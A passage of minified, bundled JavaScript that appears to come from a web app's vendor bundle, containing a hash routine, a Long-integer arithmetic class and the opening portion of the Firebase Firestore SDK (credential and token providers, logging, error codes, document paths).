= i + (t ^ (r | ~s)) + n[14] + 2878612391 & 4294967295, i = r + (o << 15 & 4294967295 | o >>> 17), o = s + (r ^ (i | ~t)) + n[5] + 4237533241 & 4294967295, s = i + (o << 21 & 4294967295 | o >>> 11), o = t + (i ^ (s | ~r)) + n[12] + 1700485571 & 4294967295, t = s + (o << 6 & 4294967295 | o >>> 26), o = r + (s ^ (t | ~i)) + n[3] + 2399980690 & 4294967295, r = t + (o << 10 & 4294967295 | o >>> 22), o = i + (t ^ (r | ~s)) + n[10] + 4293915773 & 4294967295, i = r + (o << 15 & 4294967295 | o >>> 17), o = s + (r ^ (i | ~t)) + n[1] + 2240044497 & 4294967295, s = i + (o << 21 & 4294967295 | o >>> 11), o = t + (i ^ (s | ~r)) + n[8] + 1873313359 & 4294967295, t = s + (o << 6 & 4294967295 | o >>> 26), o = r + (s ^ (t | ~i)) + n[15] + 4264355552 & 4294967295, r = t + (o << 10 & 4294967295 | o >>> 22), o = i + (t ^ (r | ~s)) + n[6] + 2734768916 & 4294967295, i = r + (o << 15 & 4294967295 | o >>> 17), o = s + (r ^ (i | ~t)) + n[13] + 1309151649 & 4294967295, s = i + (o << 21 & 4294967295 | o >>> 11), o = t + (i ^ (s | ~r)) + n[4] + 4149444226 & 4294967295, t = s + (o << 6 & 4294967295 | o >>> 26), o = r + (s ^ (t | ~i)) + n[11] + 3174756917 & 4294967295, r = t + (o << 10 & 4294967295 | o >>> 22), o = i + (t ^ (r | ~s)) + n[2] + 718787259 & 4294967295, i = r + (o << 15 & 4294967295 | o >>> 17), o = s + (r ^ (i | ~t)) + n[9] + 3951481745 & 4294967295, e.g[0] = e.g[0] + t & 4294967295, e.g[1] = e.g[1] + (i + (o << 21 & 4294967295 | o >>> 11)) & 4294967295, e.g[2] = e.g[2] + i & 4294967295, e.g[3] = e.g[3] + r & 4294967295
}
At.prototype.j = function(e, t) {
    t === void 0 && (t = e.length);
    for (var s = t - this.blockSize, n = this.m, i = this.h, r = 0; r < t;) {
        if (i == 0)
            for (; r <= s;) Ar(this, e, r), r += this.blockSize;
        if (typeof e == "string") {
            for (; r < t;)
                if (n[i++] = e.charCodeAt(r++), i == this.blockSize) {
                    Ar(this, n), i = 0;
                    break
                }
        } else
            for (; r < t;)
                if (n[i++] = e[r++], i == this.blockSize) {
                    Ar(this, n), i = 0;
                    break
                }
    }
    this.h = i, this.i += t
};
At.prototype.l = function() {
    var e = Array((56 > this.h ? this.blockSize : 2 * this.blockSize) - this.h);
    e[0] = 128;
    for (var t = 1; t < e.length - 8; ++t) e[t] = 0;
    var s = 8 * this.i;
    for (t = e.length - 8; t < e.length; ++t) e[t] = s & 255, s /= 256;
    for (this.j(e), e = Array(16), t = s = 0; 4 > t; ++t)
        for (var n = 0; 32 > n; n += 8) e[s++] = this.g[t] >>> n & 255;
    return e
};

function ge(e, t) {
    this.h = t;
    for (var s = [], n = !0, i = e.length - 1; 0 <= i; i--) {
        var r = e[i] | 0;
        n && r == t || (s[i] = r, n = !1)
    }
    this.g = s
}
var a5 = {};

function ga(e) {
    return -128 <= e && 128 > e ? h4(e, function(t) {
        return new ge([t | 0], 0 > t ? -1 : 0)
    }) : new ge([e | 0], 0 > e ? -1 : 0)
}

function Et(e) {
    if (isNaN(e) || !isFinite(e)) return Is;
    if (0 > e) return $e(Et(-e));
    for (var t = [], s = 1, n = 0; e >= s; n++) t[n] = e / s | 0, s *= co;
    return new ge(t, 0)
}

function Vf(e, t) {
    if (e.length == 0) throw Error("number format error: empty string");
    if (t = t || 10, 2 > t || 36 < t) throw Error("radix out of range: " + t);
    if (e.charAt(0) == "-") return $e(Vf(e.substring(1), t));
    if (0 <= e.indexOf("-")) throw Error('number format error: interior "-" character');
    for (var s = Et(Math.pow(t, 8)), n = Is, i = 0; i < e.length; i += 8) {
        var r = Math.min(8, e.length - i),
            o = parseInt(e.substring(i, i + r), t);
        8 > r ? (r = Et(Math.pow(t, r)), n = n.R(r).add(Et(o))) : (n = n.R(s), n = n.add(Et(o)))
    }
    return n
}
var co = 4294967296,
    Is = ga(0),
    fo = ga(1),
    Wl = ga(16777216);
H = ge.prototype;
H.ea = function() {
    if (at(this)) return -$e(this).ea();
    for (var e = 0, t = 1, s = 0; s < this.g.length; s++) {
        var n = this.D(s);
        e += (0 <= n ? n : co + n) * t, t *= co
    }
    return e
};
H.toString = function(e) {
    if (e = e || 10, 2 > e || 36 < e) throw Error("radix out of range: " + e);
    if (Nt(this)) return "0";
    if (at(this)) return "-" + $e(this).toString(e);
    for (var t = Et(Math.pow(e, 6)), s = this, n = "";;) {
        var i = wi(s, t).g;
        s = bi(s, i.R(t));
        var r = ((0 < s.g.length ? s.g[0] : s.h) >>> 0).toString(e);
        if (s = i, Nt(s)) return r + n;
        for (; 6 > r.length;) r = "0" + r;
        n = r + n
    }
};
H.D = function(e) {
    return 0 > e ? 0 : e < this.g.length ? this.g[e] : this.h
};

function Nt(e) {
    if (e.h != 0) return !1;
    for (var t = 0; t < e.g.length; t++)
        if (e.g[t] != 0) return !1;
    return !0
}

function at(e) {
    return e.h == -1
}
H.X = function(e) {
    return e = bi(this, e), at(e) ? -1 : Nt(e) ? 0 : 1
};

function $e(e) {
    for (var t = e.g.length, s = [], n = 0; n < t; n++) s[n] = ~e.g[n];
    return new ge(s, ~e.h).add(fo)
}
H.abs = function() {
    return at(this) ? $e(this) : this
};
H.add = function(e) {
    for (var t = Math.max(this.g.length, e.g.length), s = [], n = 0, i = 0; i <= t; i++) {
        var r = n + (this.D(i) & 65535) + (e.D(i) & 65535),
            o = (r >>> 16) + (this.D(i) >>> 16) + (e.D(i) >>> 16);
        n = o >>> 16, r &= 65535, o &= 65535, s[i] = o << 16 | r
    }
    return new ge(s, s[s.length - 1] & -2147483648 ? -1 : 0)
};

function bi(e, t) {
    return e.add($e(t))
}
H.R = function(e) {
    if (Nt(this) || Nt(e)) return Is;
    if (at(this)) return at(e) ? $e(this).R($e(e)) : $e($e(this).R(e));
    if (at(e)) return $e(this.R($e(e)));
    if (0 > this.X(Wl) && 0 > e.X(Wl)) return Et(this.ea() * e.ea());
    for (var t = this.g.length + e.g.length, s = [], n = 0; n < 2 * t; n++) s[n] = 0;
    for (n = 0; n < this.g.length; n++)
        for (var i = 0; i < e.g.length; i++) {
            var r = this.D(n) >>> 16,
                o = this.D(n) & 65535,
                l = e.D(i) >>> 16,
                a = e.D(i) & 65535;
            s[2 * n + 2 * i] += o * a, Kn(s, 2 * n + 2 * i), s[2 * n + 2 * i + 1] += r * a, Kn(s, 2 * n + 2 * i + 1), s[2 * n + 2 * i + 1] += o * l, Kn(s, 2 * n + 2 * i + 1), s[2 * n + 2 * i + 2] += r * l, Kn(s, 2 * n + 2 * i + 2)
        }
    for (n = 0; n < t; n++) s[n] = s[2 * n + 1] << 16 | s[2 * n];
    for (n = t; n < 2 * t; n++) s[n] = 0;
    return new ge(s, 0)
};

function Kn(e, t) {
    for (;
        (e[t] & 65535) != e[t];) e[t + 1] += e[t] >>> 16, e[t] &= 65535, t++
}

function Xs(e, t) {
    this.g = e, this.h = t
}

function wi(e, t) {
    if (Nt(t)) throw Error("division by zero");
    if (Nt(e)) return new Xs(Is, Is);
    if (at(e)) return t = wi($e(e), t), new Xs($e(t.g), $e(t.h));
    if (at(t)) return t = wi(e, $e(t)), new Xs($e(t.g), t.h);
    if (30 < e.g.length) {
        if (at(e) || at(t)) throw Error("slowDivide_ only works with positive integers.");
        for (var s = fo, n = t; 0 >= n.X(e);) s = ql(s), n = ql(n);
        var i = ys(s, 1),
            r = ys(n, 1);
        for (n = ys(n, 2), s = ys(s, 2); !Nt(n);) {
            var o = r.add(n);
            0 >= o.X(e) && (i = i.add(s), r = o), n = ys(n, 1), s = ys(s, 1)
        }
        return t = bi(e, i.R(t)), new Xs(i, t)
    }
    for (i = Is; 0 <= e.X(t);) {
        for (s = Math.max(1, Math.floor(e.ea() / t.ea())), n = Math.ceil(Math.log(s) / Math.LN2), n = 48 >= n ? 1 : Math.pow(2, n - 48), r = Et(s), o = r.R(t); at(o) || 0 < o.X(e);) s -= n, r = Et(s), o = r.R(t);
        Nt(r) && (r = fo), i = i.add(r), e = bi(e, o)
    }
    return new Xs(i, e)
}
H.gb = function(e) {
    return wi(this, e).h
};
H.and = function(e) {
    for (var t = Math.max(this.g.length, e.g.length), s = [], n = 0; n < t; n++) s[n] = this.D(n) & e.D(n);
    return new ge(s, this.h & e.h)
};
H.or = function(e) {
    for (var t = Math.max(this.g.length, e.g.length), s = [], n = 0; n < t; n++) s[n] = this.D(n) | e.D(n);
    return new ge(s, this.h | e.h)
};
H.xor = function(e) {
    for (var t = Math.max(this.g.length, e.g.length), s = [], n = 0; n < t; n++) s[n] = this.D(n) ^ e.D(n);
    return new ge(s, this.h ^ e.h)
};

function ql(e) {
    for (var t = e.g.length + 1, s = [], n = 0; n < t; n++) s[n] = e.D(n) << 1 | e.D(n - 1) >>> 31;
    return new ge(s, e.h)
}

function ys(e, t) {
    var s = t >> 5;
    t %= 32;
    for (var n = e.g.length - s, i = [], r = 0; r < n; r++) i[r] = 0 < t ? e.D(r + s) >>> t | e.D(r + s + 1) << 32 - t : e.D(r + s);
    return new ge(i, e.h)
}
ct.prototype.send = ct.prototype.u;
ct.prototype.open = ct.prototype.m;
ct.prototype.close = ct.prototype.close;
ra.NO_ERROR = 0;
ra.TIMEOUT = 8;
ra.HTTP_ERROR = 6;
$4.COMPLETE = "complete";
R4.EventType = Nn;
Nn.OPEN = "a";
Nn.CLOSE = "b";
Nn.ERROR = "c";
Nn.MESSAGE = "d";
ke.prototype.listen = ke.prototype.O;
Ae.prototype.listenOnce = Ae.prototype.P;
Ae.prototype.getLastError = Ae.prototype.Sa;
Ae.prototype.getLastErrorCode = Ae.prototype.Ia;
Ae.prototype.getStatus = Ae.prototype.da;
Ae.prototype.getResponseJson = Ae.prototype.Wa;
Ae.prototype.getResponseText = Ae.prototype.ja;
Ae.prototype.send = Ae.prototype.ha;
Ae.prototype.setWithCredentials = Ae.prototype.Oa;
At.prototype.digest = At.prototype.l;
At.prototype.reset = At.prototype.reset;
At.prototype.update = At.prototype.j;
ge.prototype.add = ge.prototype.add;
ge.prototype.multiply = ge.prototype.R;
ge.prototype.modulo = ge.prototype.gb;
ge.prototype.compare = ge.prototype.X;
ge.prototype.toNumber = ge.prototype.ea;
ge.prototype.toString = ge.prototype.toString;
ge.prototype.getBits = ge.prototype.D;
ge.fromNumber = Et;
ge.fromString = Vf;
var l5 = ge;
const Kl = "@firebase/firestore";
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class je {
    constructor(t) {
        this.uid = t
    }
    isAuthenticated() {
        return this.uid != null
    }
    toKey() {
        return this.isAuthenticated() ? "uid:" + this.uid : "anonymous-user"
    }
    isEqual(t) {
        return t.uid === this.uid
    }
}
je.UNAUTHENTICATED = new je(null), je.GOOGLE_CREDENTIALS = new je("google-credentials-uid"), je.FIRST_PARTY = new je("first-party-uid"), je.MOCK_USER = new je("mock-user");
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let $n = "10.8.0";
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const Rs = new kd("@firebase/firestore");

function tt(e, ...t) {
    if (Rs.logLevel <= ve.DEBUG) {
        const s = t.map(va);
        Rs.debug(`Firestore (${$n}): ${e}`, ...s)
    }
}

function ma(e, ...t) {
    if (Rs.logLevel <= ve.ERROR) {
        const s = t.map(va);
        Rs.error(`Firestore (${$n}): ${e}`, ...s)
    }
}

function c5(e, ...t) {
    if (Rs.logLevel <= ve.WARN) {
        const s = t.map(va);
        Rs.warn(`Firestore (${$n}): ${e}`, ...s)
    }
}

function va(e) {
    if (typeof e == "string") return e;
    try {
        /**
         * @license
         * Copyright 2020 Google LLC
         *
         * Licensed under the Apache License, Version 2.0 (the "License");
         * you may not use this file except in compliance with the License.
         * You may obtain a copy of the License at
         *
         *   http://www.apache.org/licenses/LICENSE-2.0
         *
         * Unless required by applicable law or agreed to in writing, software
         * distributed under the License is distributed on an "AS IS" BASIS,
         * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
         * See the License for the specific language governing permissions and
         * limitations under the License.
         */
        return function(s) {
            return JSON.stringify(s)
        }(e)
    } catch {
        return e
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function En(e = "Unexpected state") {
    const t = `FIRESTORE (${$n}) INTERNAL ASSERTION FAILED: ` + e;
    throw ma(t), new Error(t)
}

function po(e, t) {
    e || En()
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
const Le = {
    OK: "ok",
    CANCELLED: "cancelled",
    UNKNOWN: "unknown",
    INVALID_ARGUMENT: "invalid-argument",
    DEADLINE_EXCEEDED: "deadline-exceeded",
    NOT_FOUND: "not-found",
    ALREADY_EXISTS: "already-exists",
    PERMISSION_DENIED: "permission-denied",
    UNAUTHENTICATED: "unauthenticated",
    RESOURCE_EXHAUSTED: "resource-exhausted",
    FAILED_PRECONDITION: "failed-precondition",
    ABORTED: "aborted",
    OUT_OF_RANGE: "out-of-range",
    UNIMPLEMENTED: "unimplemented",
    INTERNAL: "internal",
    UNAVAILABLE: "unavailable",
    DATA_LOSS: "data-loss"
};
class Ie extends Bs {
    constructor(t, s) {
        super(t, s), this.code = t, this.message = s, this.toString = () => `${this.name}: [code=${this.code}]: ${this.message}`
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ns {
    constructor() {
        this.promise = new Promise((t, s) => {
            this.resolve = t, this.reject = s
        })
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class jf {
    constructor(t, s) {
        this.user = s, this.type = "OAuth", this.headers = new Map, this.headers.set("Authorization", `Bearer ${t}`)
    }
}
class d5 {
    getToken() {
        return Promise.resolve(null)
    }
    invalidateToken() {}
    start(t, s) {
        t.enqueueRetryable(() => s(je.UNAUTHENTICATED))
    }
    shutdown() {}
}
class f5 {
    constructor(t) {
        this.token = t, this.changeListener = null
    }
    getToken() {
        return Promise.resolve(this.token)
    }
    invalidateToken() {}
    start(t, s) {
        this.changeListener = s, t.enqueueRetryable(() => s(this.token.user))
    }
    shutdown() {
        this.changeListener = null
    }
}
class p5 {
    constructor(t) {
        this.t = t, this.currentUser = je.UNAUTHENTICATED, this.i = 0, this.forceRefresh = !1, this.auth = null
    }
    start(t, s) {
        let n = this.i;
        const i = a => this.i !== n ? (n = this.i, s(a)) : Promise.resolve();
        let r = new Ns;
        this.o = () => {
            this.i++, this.currentUser = this.u(), r.resolve(), r = new Ns, t.enqueueRetryable(() => i(this.currentUser))
        };
        const o = () => {
                const a = r;
                t.enqueueRetryable(async () => {
                    await a.promise, await i(this.currentUser)
                })
            },
            l = a => {
                tt("FirebaseAuthCredentialsProvider", "Auth detected"), this.auth = a, this.auth.addAuthTokenListener(this.o), o()
            };
        this.t.onInit(a => l(a)), setTimeout(() => {
            if (!this.auth) {
                const a = this.t.getImmediate({
                    optional: !0
                });
                a ? l(a) : (tt("FirebaseAuthCredentialsProvider", "Auth not yet detected"), r.resolve(), r = new Ns)
            }
        }, 0), o()
    }
    getToken() {
        const t = this.i,
            s = this.forceRefresh;
        return this.forceRefresh = !1, this.auth ? this.auth.getToken(s).then(n => this.i !== t ? (tt("FirebaseAuthCredentialsProvider", "getToken aborted due to token change."), this.getToken()) : n ? (po(typeof n.accessToken == "string"), new jf(n.accessToken, this.currentUser)) : null) : Promise.resolve(null)
    }
    invalidateToken() {
        this.forceRefresh = !0
    }
    shutdown() {
        this.auth && this.auth.removeAuthTokenListener(this.o)
    }
    u() {
        const t = this.auth && this.auth.getUid();
        return po(t === null || typeof t == "string"), new je(t)
    }
}
class u5 {
    constructor(t, s, n) {
        this.l = t, this.h = s, this.P = n, this.type = "FirstParty", this.user = je.FIRST_PARTY, this.I = new Map
    }
    T() {
        return this.P ? this.P() : null
    }
    get headers() {
        this.I.set("X-Goog-AuthUser", this.l);
        const t = this.T();
        return t && this.I.set("Authorization", t), this.h && this.I.set("X-Goog-Iam-Authorization-Token", this.h), this.I
    }
}
class h5 {
    constructor(t, s, n) {
        this.l = t, this.h = s, this.P = n
    }
    getToken() {
        return Promise.resolve(new u5(this.l, this.h, this.P))
    }
    start(t, s) {
        t.enqueueRetryable(() => s(je.FIRST_PARTY))
    }
    shutdown() {}
    invalidateToken() {}
}
class g5 {
    constructor(t) {
        this.value = t, this.type = "AppCheck", this.headers = new Map, t && t.length > 0 && this.headers.set("x-firebase-appcheck", this.value)
    }
}
class m5 {
    constructor(t) {
        this.A = t, this.forceRefresh = !1, this.appCheck = null, this.R = null
    }
    start(t, s) {
        const n = r => {
            r.error != null && tt("FirebaseAppCheckTokenProvider", `Error getting App Check token; using placeholder token instead. Error: ${r.error.message}`);
            const o = r.token !== this.R;
            return this.R = r.token, tt("FirebaseAppCheckTokenProvider", `Received ${o?"new":"existing"} token.`), o ? s(r.token) : Promise.resolve()
        };
        this.o = r => {
            t.enqueueRetryable(() => n(r))
        };
        const i = r => {
            tt("FirebaseAppCheckTokenProvider", "AppCheck detected"), this.appCheck = r, this.appCheck.addTokenListener(this.o)
        };
        this.A.onInit(r => i(r)), setTimeout(() => {
            if (!this.appCheck) {
                const r = this.A.getImmediate({
                    optional: !0
                });
                r ? i(r) : tt("FirebaseAppCheckTokenProvider", "AppCheck not yet detected")
            }
        }, 0)
    }
    getToken() {
        const t = this.forceRefresh;
        return this.forceRefresh = !1, this.appCheck ? this.appCheck.getToken(t).then(s => s ? (po(typeof s.token == "string"), this.R = s.token, new g5(s.token)) : null) : Promise.resolve(null)
    }
    invalidateToken() {
        this.forceRefresh = !0
    }
    shutdown() {
        this.appCheck && this.appCheck.removeTokenListener(this.o)
    }
}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function v5(e) {
    const t = typeof self < "u" && (self.crypto || self.msCrypto),
        s = new Uint8Array(e);
    if (t && typeof t.getRandomValues == "function") t.getRandomValues(s);
    else
        for (let n = 0; n < e; n++) s[n] = Math.floor(256 * Math.random());
    return s
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class y5 {
    static newId() {
        const t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",
            s = Math.floor(256 / t.length) * t.length;
        let n = "";
        for (; n.length < 20;) {
            const i = v5(40);
            for (let r = 0; r < i.length; ++r) n.length < 20 && i[r] < s && (n += t.charAt(i[r] % t.length))
        }
        return n
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class xi {
    constructor(t, s, n) {
        s === void 0 ? s = 0 : s > t.length && En(), n === void 0 ? n = t.length - s : n > t.length - s && En(), this.segments = t, this.offset = s, this.len = n
    }
    get length() {
        return this.len
    }
    isEqual(t) {
        return xi.comparator(this, t) === 0
    }
    child(t) {
        const s = this.segments.slice(this.offset, this.limit());
        return t instanceof xi ? t.forEach(n => {
            s.push(n)
        }) : s.push(t), this.construct(s)
    }
    limit() {
        return this.offset + this.length
    }
    popFirst(t) {
        return t = t === void 0 ? 1 : t, this.construct(this.segments, this.offset + t, this.length - t)
    }
    popLast() {
        return this.construct(this.segments, this.offset, this.length - 1)
    }
    firstSegment() {
        return this.segments[this.offset]
    }
    lastSegment() {
        return this.get(this.length - 1)
    }
    get(t) {
        return this.segments[this.offset + t]
    }
    isEmpty() {
        return this.length === 0
    }
    isPrefixOf(t) {
        if (t.length < this.length) return !1;
        for (let s = 0; s < this.length; s++)
            if (this.get(s) !== t.get(s)) return !1;
        return !0
    }
    isImmediateParentOf(t) {
        if (this.length + 1 !== t.length) return !1;
        for (let s = 0; s < this.length; s++)
            if (this.get(s) !== t.get(s)) return !1;
        return !0
    }
    forEach(t) {
        for (let s = this.offset, n = this.limit(); s < n; s++) t(this.segments[s])
    }
    toArray() {
        return this.segments.slice(this.offset, this.limit())
    }
    static comparator(t, s) {
        const n = Math.min(t.length, s.length);
        for (let i = 0; i < n; i++) {
            const r = t.get(i),
                o = s.get(i);
            if (r < o) return -1;
            if (r > o) return 1
        }
        return t.length < s.length ? -1 : t.length > s.length ? 1 : 0
    }
}
class rt extends xi {
    construct(t, s, n) {
        return new rt(t, s, n)
    }
    canonicalString() {
        return this.toArray().join("/")
    }
    toString() {
        return this.canonicalString()
    }
    toUriEncodedString() {
        return this.toArray().map(encodeURIComponent).join("/")
    }
    static fromString(...t) {
        const s = [];
        for (const n of t) {
            if (n.indexOf("//") >= 0) throw new Ie(Le.INVALID_ARGUMENT, `Invalid segment (${n}). Paths must not contain // in them.`);
            s.push(...n.split("/").filter(i => i.length > 0))
        }
        return new rt(s)
    }
    static emptyPath() {
        return new rt([])
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class os {
    constructor(t) {
        this.path = t
    }
    static fromPath(t) {
        return new os(rt.fromString(t))
    }
    static fromName(t) {
        return new os(rt.fromString(t).popFirst(5))
    }
    static empty() {
        return new os(rt.emptyPath())
    }
    get collectionGroup() {
        return this.path.popLast().lastSegment()
    }
    hasCollectionId(t) {
        return this.path.length >= 2 && this.path.get(this.path.length - 2) === t
    }
    getCollectionGroup() {
        return this.path.get(this.path.length - 2)
    }
    getCollectionPath() {
        return this.path.popLast()
    }
    isEqual(t) {
        return t !== null && rt.comparator(this.path, t.path) === 0
    }
    toString() {
        return this.path.toString()
    }
    static comparator(t, s) {
        return rt.comparator(t.path, s.path)
    }
    static isDocumentKey(t) {
        return t.length % 2 == 0
    }
    static fromSegments(t) {
        return new os(new rt(t.slice()))
    }
}

function Bf(e) {
    return e.name === "IndexedDbTransactionError"
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class b5 {
    constructor(t, s, n, i, r, o, l, a, c) {
        this.databaseId = t, this.appId = s, this.persistenceKey = n, this.host = i, this.ssl = r, this.forceLongPolling = o, this.autoDetectLongPolling = l, this.longPollingOptions = a, this.useFetchStreams = c
    }
}
class _i {
    constructor(t, s) {
        this.projectId = t, this.database = s || "(default)"
    }
    static empty() {
        return new _i("", "")
    }
    get isDefaultDatabase() {
        return this.database === "(default)"
    }
    isEqual(t) {
        return t instanceof _i && t.projectId === this.projectId && t.database === this.database
    }
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class w5 {
    constructor(t, s = null, n = [], i = [], r = null, o = "F", l = null, a = null) {
        this.path = t, this.collectionGroup = s, this.explicitOrderBy = n, this.filters = i, this.limit = r, this.limitType = o, this.startAt = l, this.endAt = a, this.le = null, this.he = null, this.Pe = null, this.startAt, this.endAt
    }
}

function x5(e) {
    return new w5(e)
}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
var Zl, oe;
(oe = Zl || (Zl = {}))[oe.OK = 0] = "OK", oe[oe.CANCELLED = 1] = "CANCELLED", oe[oe.UNKNOWN = 2] = "UNKNOWN", oe[oe.INVALID_ARGUMENT = 3] = "INVALID_ARGUMENT", oe[oe.DEADLINE_EXCEEDED = 4] = "DEADLINE_EXCEEDED", oe[oe.NOT_FOUND = 5] = "NOT_FOUND", oe[oe.ALREADY_EXISTS = 6] = "ALREADY_EXISTS", oe[oe.PERMISSION_DENIED = 7] = "PERMISSION_DENIED", oe[oe.UNAUTHENTICATED = 16] = "UNAUTHENTICATED", oe[oe.RESOURCE_EXHAUSTED = 8] = "RESOURCE_EXHAUSTED", oe[oe.FAILED_PRECONDITION = 9] = "FAILED_PRECONDITION", oe[oe.ABORTED = 10] = "ABORTED", oe[oe.OUT_OF_RANGE = 11] = "OUT_OF_RANGE", oe[oe.UNIMPLEMENTED = 12] = "UNIMPLEMENTED", oe[oe.INTERNAL = 13] = "INTERNAL", oe[oe.UNAVAILABLE = 14] = "UNAVAILABLE", oe[oe.DATA_LOSS = 15] = "DATA_LOSS";
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
